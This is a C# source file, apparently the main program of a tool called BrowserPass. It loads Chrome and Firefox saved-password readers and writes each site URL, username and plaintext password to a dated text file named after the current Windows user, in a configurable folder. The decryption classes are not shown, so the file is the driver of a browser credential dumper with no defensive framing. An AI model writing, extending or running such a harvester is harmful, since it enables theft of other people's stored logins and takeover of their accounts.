using System;
using System.Collections.Generic;
using System.IO;

namespace BrowserPass
{
    class Program
    {
        static void Main(string[] args)
        {
            List<IPassReader> readers = new List<IPassReader>();
            readers.Add(new ChromePassReader());
            readers.Add(new FirefoxPassReader());
            //readers.Add(new IE10PassReader());

            string day = DateTime.Now.Day.ToString();
            if (day.Length == 1) day = "0" + day;
            string month = DateTime.Now.Month.ToString();
            if (month.Length == 1) month = "0" + month;
            string year = DateTime.Now.Year.ToString();

            if (!File.Exists("SAVELOCATION.txt"))
            {
                File.WriteAllText("SAVELOCATION.txt", ".\\Passwords");
            }

            string location = File.ReadAllText("SAVELOCATION.txt");
            if (!Directory.Exists(location)) Directory.CreateDirectory(location);

            StreamWriter sw = new StreamWriter(String.Format(@"{4}\{0}-{1}-{2} {3}.txt", year, month, day, Environment.UserName, location));

            foreach (var reader in readers)
            {
                sw.WriteLine($"------------------------");
                sw.WriteLine($"DATA SOURCE = {reader.BrowserName}");
                sw.WriteLine($"------------------------");
                sw.WriteLine("");
                try
                {
                    IEnumerable<CredentialModel> data = reader.ReadPasswords();
                    foreach (var d in data)
                        sw.WriteLine($"{d.Url}\n{d.Username}\n{d.Password}\n");
                }
                catch (Exception ex)
                {
                    sw.WriteLine($"Error reading {reader.BrowserName} passwords: \n" + ex.Message);
                    sw.WriteLine("");
                }
            }

            sw.Close();
        }
    }
}
